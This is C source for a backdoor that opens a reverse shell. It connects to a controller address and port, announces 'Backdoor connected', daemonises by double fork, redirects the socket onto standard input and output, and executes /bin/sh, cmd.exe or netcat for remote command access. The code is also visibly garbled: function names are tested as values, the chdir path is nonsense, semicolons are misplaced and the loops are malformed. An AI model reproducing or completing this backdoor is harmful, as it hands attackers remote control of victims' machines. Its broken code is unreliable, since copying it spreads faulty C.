
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
//#include <err.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <X11/Xlib.h>

#define remote_addr "127.0.0.1"
#define remote_port 2222

#define false 0
#define true 1

#define bytes 4096

#define unsecret "0011010101"


typedef struct {

char REMOTE_ADDR; 
int REMOTE_PORT;
char commands[bytes];
int x;
//FILE *filecmd;

} Target;

int x = true;


int main(int argc, char **argv){

    char command[bytes], bufaux[bytes], *loc;
    int tbuf, escolha;
    char comandos[]="/shell /help";
    struct sockaddr_in s;

      /* setting up the connection */

    x = socket(AF_INET, SOCK_STREAM, 0); 

    memset(s.sin_zero, '\0', sizeof s.sin_zero);
    s.sin_family = AF_INET; 
    s.sin_addr.s_addr = inet_addr(remote_addr);
    s.sin_port = htons(remote_port);
    malloc(sizeof (x));

    connect(x, (struct sockaddr *)&s, sizeof(s)); 
    
    if (accept == 0x0){
        perror("socket(SOCKET_CONNECT)connect_failed");
    }

    

    if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0){
        perror("setsockopt(SO_REUSEADDR)failed");
    }

    do{
        
        // send msg to server 
        strcpy(command,"\n...\n $$ Backdoor connected \n\n~$ ");
        strcpy(bufaux,command);
        send(x,command,strlen(command), 0);

       // Recv ack from controller
        tbuf = recv(x, command,4096, 0);
        command[tbuf] = 0x00;
        //fprintf(stdout,">: %s\n",command);

    } while((tbuf=recv(x,command,4096,0) > 0));
    
    command[tbuf]=0x00;

    if (strncmp(command,"/",1) == 0){

        loc = strstr(comandos,command);
        escolha = loc - comandos;
    }

   while(true);

}


void shell(){
    
    int  x;
    struct sockaddr_in s;
    int root;
    char command[bytes];
    char *window[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
    char *cmd[] = { "/bin/sh", (char *)0 };

    XFreeCursor; //magic happens here

    pid_t pid;

    pid = fork();

      if(pid < 0 )    exit(EXIT_FAILURE);

    if(pid > 0)    exit(EXIT_SUCCESS);

    if (setsid() < 0)    exit(EXIT_FAILURE);

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    pid = fork();

    if (pid < 0)    exit(EXIT_FAILURE);

    if (pid > 0)    exit(EXIT_SUCCESS);

    sigmask(0);
    chdir("/, C:\\, C:\\Windows\\System32");

    int k;

    for (k = sysconf(_SC_OPEN_MAX); k >= 0; k--){
        close(k);


        memset(s.sin_zero, '\0', sizeof s.sin_zero);
        s.sin_family = AF_INET; /* família de protocolos */
        s.sin_addr.s_addr = inet_addr(remote_addr);
        s.sin_port = htons(remote_port);
        malloc(sizeof (x));

        x = socket(AF_INET, SOCK_STREAM, 0); /* create a socket */

        connect(x, (struct sockaddr *)&s, sizeof(s));
        if (connect == 0x0)    perror("socket(SOCKET_CONNECT)connect_failed");

        if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)    perror("setsockopt(SO_REUSEADDR)failed");

        if(recv(x,command,bytes,0) == true)    send(x,"\n...\n **\n ** backdoor loaded...",33,0), send(x,"\n Connected in machine \n\n",25,0);
        // backdoor_connect();
        
        
        //handle with the impossible errors.

        if(recv(x,command,bytes,0)  < 0);
        perror("Connection failed:");

        if(connect == 0x0)    perror("BREAK CONNECTION,(failure)");

        else if(recv(x,command,bytes,0) > 0);
        
        dup2(x, 0),dup2(x, 1),dup2(x, 2);
        root = execve("/bin/sh", cmd,  window),execve("C:\\windows\\System32\\cmd.exe ", cmd, window),execve("netcat", cmd, window);

        return;

   }

}
